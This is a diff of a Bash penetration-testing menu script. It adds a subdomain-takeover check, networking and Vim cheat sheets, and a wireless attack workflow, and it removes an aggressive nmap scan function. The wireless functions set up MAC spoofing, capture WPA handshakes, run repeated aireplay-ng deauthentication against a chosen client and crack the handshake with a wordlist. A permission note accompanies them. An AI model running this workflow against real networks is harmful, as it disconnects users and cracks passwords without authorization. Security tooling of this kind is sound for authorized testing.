+
+        # Function: Perform Subdomain Takeover check
+        function perform_takeover_check() {
+            # Define the command to check CNAME records
+            COMMAND="host -t cname"
+
+            # Iterate over each subdomain in the file
+            echo -e "${CYAN} Checking for potential Subdomain Takeover vulnerabilities... ${RESET}"
+            while IFS= read -r WORD; do
+                RESULT=$($COMMAND "$WORD"."$HOST" 2>/dev/null | grep "alias for")
+                if [[ -n "$RESULT" ]]; then
+                    # Print results if a CNAME alias is found
+                    echo -e "${YELLOW} Subdomain: ${RESET}$WORD.$HOST"
+                    echo -e "${GREEN} CNAME: ${RESET}$RESULT"
+                fi
+            done < "$FILE"
+        }
+
+        # Function: Control the workflow
+        function takeover_workflow() {
+            collect_inputs || return  # Collect inputs and return if validation fails
+            perform_takeover_check  # Perform the subdomain takeover checks
+            pause_script  # Pause and wait for the user before returning to the menu
+            main_menu  # Return to the main menu
+        }
+
+        # Execute the workflow
+        takeover_workflow
+    }
+
+    # Function: Show a list of useful Linux networking commands
+    function useful_linux_commands() {
+        # Function: Display useful Linux networking commands
+            #
+            # Description:
+            # This script presents a collection of useful Linux commands for network management,
+            # including commands for checking ARP tables, network interfaces, active connections,
+            # and routing information.
+            #
+            # Dependencies:
+            # - Basic Linux utilities (arp, ifconfig, ip, netstat, ss, route)
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-25
+            # Last Updated: 2025-01-25
+            # Version: 1.1
+            #
+            # Notes:
+            # - These commands are useful for system administrators and penetration testers.
+            # - Some commands require administrative privileges (sudo).
+            #
+            # Example usage:
+            # - Running this function will display categorized networking commands.
+
+        title="Useful Linux Networking Commands"  # Define the title for this operation
+
+        # Function to display useful network management commands
+        function network_management_commands() {
+            display_section_no_log "USEFUL NETOWRK MANAGEMENT COMMANDS"
+            
+                display_description "List ARP Table"
+                    display_command  "arp -a" 
+                    display_command "ip neigh show"
+            
+                display_description "Show Configured IPs" 
+                    display_command "ifconfig -a"
+                    display_command "ip addr"
+            
+                display_description "Enable/Disable Network Interface"
+                    display_command  "ifconfig eth0 up/down"
+                    display_command "ip link set eth0 up/down"
+            
+            echo -e "${GRAY} Note: Replace 'eth0' with your actual network interface. Use 'ifconfig -a' or 'ip addr' to find it.${RESET}"
+            echo
+            subtitle;  # Add a decorative subtitle
+        }
+
+        # Function to display connection monitoring commands
+        function connection_monitoring_commands() {
+            display_section_no_log " ACTIVE CONNECTIONS"
+            
+            display_description "Show Active Connections"
+            display_command "netstat"
+            display_command "ss"
+            
+            echo -e "${GRAY} Note: To check for suspicious connections, use 'ss -lntp'.${RESET}"
+            echo
+            subtitle;  # Add a decorative subtitle
+        }
+
+        # Function to display routing-related commands
+        function routing_commands() {
+            display_section_no_log " ROUTING INFORMATION"
+            
+            display_description "Show Routing Table"
+            display_command  "route"
+            display_command "ip route"
+            
+            subtitle;  # Add a decorative subtitle
+        }
+
+        # Function to display persistent network configuration information
+        function network_configuration_info() {
+            display_section_no_log "PERSISTENT NETWORK CONFIGURATION"
+            echo -e "${GRENN} In ${RED}Debian-based${RESET} systems, the persistent network configuration is located in: ${RED}/etc/network/interfaces${RESET}"
+            echo
+            echo -e "${GRENN} In ${RED}Red Hat-based${RESET} systems, network configurations are stored in: ${RED}/etc/sysconfig/network-scripts${RESET}"
+            echo
+            subtitle;  # Add a decorative subtitle
+        }
+
+        # Main execution workflow
+        function useful_commands_workflow() {
             display_banner_inside_functions
-            disable_monitor_mode
-            list_available_interfaces
-            configure_monitor_mode
-            passive_network_monitoring
-            scan_target_ap
-            capture_handshake
-            deauthentication_attack
-            crack_handshake
+            network_management_commands
+            connection_monitoring_commands
+            routing_commands
+            network_configuration_info
             exit_to_main_menu
         }
 
-        # Start Wireless Pentest Workflow
-        wireless_pentest_workflow
+        # Execute workflow
+        useful_commands_workflow
+    }
+
+    # Function: Quick Reference Guide for Vim Commands
+    function vim_quick_reference() {
+        # vim_quick_reference - Quick Reference Guide for Vim Commands
+            #
+            # Description:
+            #   This script provides a quick reference for essential Vim commands,
+            #   covering navigation, editing, saving, and common operations.
+            #
+            # Features:
+            #   - Covers essential commands for inserting, saving, and exiting Vim
+            #   - Includes text navigation, deletion, undo/redo, search, and replace
+            #   - Provides an easy-to-read guide with structured formatting
+            #
+            # Usage:
+            #   Run this script to display a quick reference for using Vim.
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-26
+            # Last Updated: 2025-01-30
+            # Version: 2.0
+            #
+            # Notes:
+            #   - This is NOT a full Vim tutorial but a **rapid cheat sheet**.
+            #   - Useful for Red Team operations, forensics, and system admins.
+
+        title="VIM QUICK REFERENCE" # Title
+
+        function display_vim_header() {
+            display_banner_inside_functions
+        }
+
+        function vim_text_insertion() {
+            echo -e "${YELLOW}Text Insertion:${RESET}"
+            echo -e "Press 'i' to enter INSERT mode."
+        }
+
+        function vim_save_exit() {
+            echo -e "\n${YELLOW}Saving and Exiting:${RESET}"
+            echo -e "Press 'Esc' to exit INSERT mode, then type ':wq' to save and quit."
+        }
+
+        function vim_exit_without_saving() {
+            echo -e "\n${YELLOW}Exit Without Saving:${RESET}"
+            echo -e "Press 'Esc' to exit INSERT mode, then type ':q!' to quit without saving."
+        }
+
+        function vim_navigation() {
+            echo -e "\n${YELLOW}Navigation:${RESET}"
+            echo -e "Use arrow keys or 'h' (left), 'j' (down), 'k' (up), 'l' (right)."
+        }
+
+        function vim_delete_text() {
+            echo -e "\n${YELLOW}Deleting Text:${RESET}"
+            echo -e "Press 'x' to delete the character under the cursor."
+        }
+
+        function vim_undo_redo() {
+            echo -e "\n${YELLOW}Undo & Redo:${RESET}"
+            echo -e "Press 'u' to undo. Press 'Ctrl + r' to redo."
+        }
+
+        function vim_search_replace() {
+            echo -e "\n${YELLOW}Search & Replace:${RESET}"
+            echo -e "Type '/' to search. Use ':s/old/new/g' to replace all instances."
+        }
+
+        function vim_help() {
+            echo -e "\n${YELLOW}Help:${RESET}"
+            echo -e "Type ':help' for more detailed documentation."
+        }
+
+        function display_vim_footer() {
+            echo -e "\n${GREEN}===================================================${RESET}"
+            echo
+        }
+
+        # Execute all functions in order
+        function vim_quick_reference_workflow() {
+            display_vim_header
+            vim_text_insertion
+            vim_save_exit
+            vim_exit_without_saving
+            vim_navigation
+            vim_delete_text
+            vim_undo_redo
+            vim_search_replace
+            vim_help
+            display_vim_footer
+            exit_to_main_menu
+        }
+
+        # Start the Vim usage reminder workflow
+        vim_quick_reference_workflow
     }
 
     # Function: Windows Basic Commands Quick Reference
@@ -3207,83 +3174,114 @@ RELEASE="ANAKIN"
         main_windows_reference
     }
 
-    # Function: Nmap Network Discovery
-    function nmap_network_discovery() {
-        # Function: Nmap Network Discovery  
+    # Function: Wireless Penetration Testing Toolkit
+    function wireless_pentest() {
+        # wireless_pentest - Conducts penetration testing on Wi-Fi networks
             #
             # Description:
-            #   This script automates active network reconnaissance using Nmap.
-            #   It enables the operator to select a network interface, scan all ports,  
-            #   and save results for further analysis.
+            #   Automates various attacks and reconnaissance techniques on wireless networks.
+            #   Features include monitor mode activation, handshake capture, deauthentication, and password cracking.
             #
             # Features:
-            #   - **Interactive Interface Selection**: Choose the target network dynamically.
-            #   - **Comprehensive Scanning**: Full TCP scan (-sS -p-), aggressive timing (-T5).
-            #   - **Automated Logging**: Stores scan results in structured logs.
+            #   - Enables monitor mode & MAC spoofing
+            #   - Captures network traffic & handshake authentication
+            #   - Conducts deauthentication attacks on clients
+            #   - Cracks captured handshakes using wordlists
+            #
+            # Output:
+            #   - Saves logs for further analysis
+            #
+            # Author: Z1GSN1FF3R || R3v4N || 0wL (Refactored w/GPT)
+            # Created on: 2021-01-27
+            # Last Updated: 2025-01-30
+            # Version: 2.0
             #
             # Usage:
-            #   Run this function to map the attack surface of a target network.
-            #
-            # Author: R3v4N (w/GPT)
-            # Created on: 2025-01-30
-            # Last Updated: 2025-01-31
-            # Version: 2.2
+            #   Run this function to perform a full wireless penetration test.
             #
             # Notes:
-            #   - **Red Team Focused**: Ideal for network reconnaissance & footprinting.
-            #   - **Requires root privileges** for full Nmap functionality.
-            #   - **Stealth considerations**: The aggressive timing (-T5) may trigger IDS/IPS.
+            #   - Requires root privileges
+            #   - Use responsibly & ethically
+            #   - Ensure you have permission before testing any network
 
+        title="WIRELESS PENETRATION TESTING TOOLKIT"  # Title
 
-        title="NMAP NETWORK DISCOVERY"
-
-        function select_network() {
-            echo -e " === Available Network Interfaces ==="
-            echo
-            ip -br a | awk '{print NR ") " $1 " - " $3}'
-            echo
-
-            read -r -p "Enter the number of the interface to scan: " interface_num
-            total_interfaces=$(ip -br a | wc -l)
-
-            # Validate user input
-            if [[ ! "$interface_num" =~ ^[0-9]+$ ]] || ((interface_num < 1 || interface_num > total_interfaces)); then
-                echo -e "Invalid interface number. Please try again."
-                pause_script
-                nmap_discovery_workflow
-            fi
-
-            selected_network=$(ip -br a | awk "NR==$interface_num {print \$3}")
-
-            if [[ -z "$selected_network" ]]; then
-                echo -e "Failed to retrieve network details. Exiting..."
-                exit 1
-            fi
-
-            NETWORK=$(ipcalc -n -b "$selected_network" | awk '/Network/ {print $2}')
+        # Function: Disable monitor mode if active
+        function disable_monitor_mode() {
+            log_and_display "=== Stopping monitor mode ==="
+            airmon-ng stop mon0 2>/dev/null
         }
 
-        function execute_nmap_scan() {
-            LOG_DIR="./logs"
-            if [ ! -d "$LOG_DIR" ]; then
-                mkdir -p "$LOG_DIR"
-            fi
-            LOG_FILE="${LOG_DIR}/nmap_$(date +%d%m%Y_%H%M%S).log"
-            echo -e "Starting Nmap Scan on $NETWORK..."
-            echo
-            nmap -sS -p- -T5 "$NETWORK" -oG "$LOG_FILE" #
-            echo
-            echo -e " Scan completed. Results saved in: $LOG_FILE"
+        # Function: Display available wireless interfaces
+        function list_available_interfaces() {
+            log_and_display "=== Available Wireless Interfaces ==="
+            airmon-ng
         }
 
-        function nmap_discovery_workflow() {
+        # Function: Enable monitor mode & spoof MAC address
+        function configure_monitor_mode() {
+            log_and_display "=== Configuring Monitor Mode ==="
+            ifconfig "$INTERFACE" down
+            iw dev "$INTERFACE" interface add mon0 type monitor
+            macchanger -r mon0
+            airmon-ng check kill  # Kill interfering processes
+        }
+
+        # Function: Passive network monitoring
+        function passive_network_monitoring() {
+            local timestamp
+            timestamp=$(date +"%d%H%M%b%y")
+            log_and_display "=== Starting Passive Network Monitoring ==="
+            airodump-ng mon0 --write "monitoring_log_$timestamp"
+        }
+
+        # Function: Targeted AP scanning
+        function scan_target_ap() {
+            log_and_display "=== Scanning Target Access Point ==="
+            read -r -p "Enter Target AP BSSID (MAC Address): " MACTARGET
+            read -r -p "Enter Target AP Channel: " CHANNEL
+            airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_log
+        }
+
+        # Function: Capture WPA/WPA2 handshake
+        function capture_handshake() {
+            log_and_display "=== Capturing 4-Way Handshake ==="
+            tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write handshake_log &
+        }
+
+        # Function: Conduct deauthentication attack
+        function deauthentication_attack() {
+            log_and_display "=== Deauth Attack: Disconnecting Clients ==="
+            read -r -p "Enter Client MAC to Deauthenticate: " CLIENTMAC
+            for ((i=1; i<=3; i++)); do
+                aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLIENTMAC" mon0 | tee -a deauth_log
+                log_and_display "Sleeping 5 seconds between attacks..."
+                sleep 5
+            done
+        }
+
+        # Function: Crack WPA/WPA2 handshake with wordlist
+        function crack_handshake() {
+            log_and_display "=== Cracking Captured Handshake ==="
+            aircrack-ng handshake_log*.cap -w /usr/share/wordlists/rockyou.txt
+        }
+
+        # Execution Workflow
+        function wireless_pentest_workflow() {
             display_banner_inside_functions
-            select_network
-            execute_nmap_scan
+            disable_monitor_mode
+            list_available_interfaces
+            configure_monitor_mode
+            passive_network_monitoring
+            scan_target_ap
+            capture_handshake
+            deauthentication_attack
+            crack_handshake
             exit_to_main_menu
         }
 
-        nmap_discovery_workflow
+        # Start Wireless Pentest Workflow
+        wireless_pentest_workflow
     }
 
 #* ====== CHECKING PARAMETERS AND EXECUTING THE MAIN ======
